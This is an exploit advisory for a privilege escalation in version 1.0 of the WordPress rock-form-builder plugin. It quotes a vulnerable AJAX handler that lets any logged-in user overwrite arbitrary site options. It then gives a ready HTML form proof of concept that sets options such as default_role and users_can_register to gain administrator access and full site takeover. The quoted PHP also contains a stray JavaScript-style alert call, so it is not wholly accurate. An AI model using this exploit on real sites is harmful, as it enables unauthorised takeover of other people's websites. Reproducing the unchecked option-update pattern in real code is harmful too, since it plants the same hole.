@@ -1,0 +1,74 @@
+------------------------------------------------------------------------------
+WordPress rock-form-builder Plugin Previlege Escalation
+------------------------------------------------------------------------------
+
+[-] Author: Evex
+
+twitter: https://twitter.com/Evex_1337
+
+[-] Affected Version:
+
+Version 1.0
+
+
+[-] Vulnerability Description:
+
+The vulnerable code is located in the /libs/rock-form-builder-functions.php
+script:
+
+         
+function rockthemes_fb_save_data(){
+
+	//Return if no value received
+	if(!isset($_POST['data'])) return exit;
+	if(!isset($_POST['db_info'])) return exit;
+	
+	extract($_POST['db_info']);
+	alert($db_name);
+	$return = '';
+	
+	$return = update_option($db_name,$_POST['data']);
+	
+	$data = $_POST['data'];
+	
+	$rockthemes_fb_references = ((get_option('rockthemes_fb_references')));
+	foreach($rockthemes_fb_references as $key => $value){
+		if((int) $rockthemes_fb_references[$key]['id'] == (int) $data['id']){
+			$rockthemes_fb_references[$key]['name'] = 	$data['form_name'];
+			$rockthemes_fb_references[$key]['modified'] = date('m/d/Y');
+			break;
+		}
+	}
+	update_option('rockthemes_fb_references', ($rockthemes_fb_references));
+	
+	echo $return;
+	
+	exit;
+}
+add_action("wp_ajax_rockthemes_fb_save", "rockthemes_fb_save_data");
+
+
+then function rockthemes_fb_save_data can be called by logged in users
+and executed which can lead to modifying wordpress settings and adding a
+new administrator which may cause the site a full take over
+
+
+[-] Proof of Concept:
+
+
+(Must be submited with a logged in user)
+OPTION:
+admin_email, default_role, users_can_register
+
+Value(must be serialized then encoded by base64):
+users_can_register (0,1)
+
+default_role (administrator, author, editor...)
+
+admin_email( whatever@duh.com )
+
+<form action="http://domain.tld/wp-admin/admin-ajax.php?action=rockthemes_fb_save" method="post" >
+	<input type="hidden" name="db_info[db_name]" value="OPTION" />
+	<input type="hidden" name="data" value="VALUE" />
+	<button type="submit" >Submit</button>
+</form>
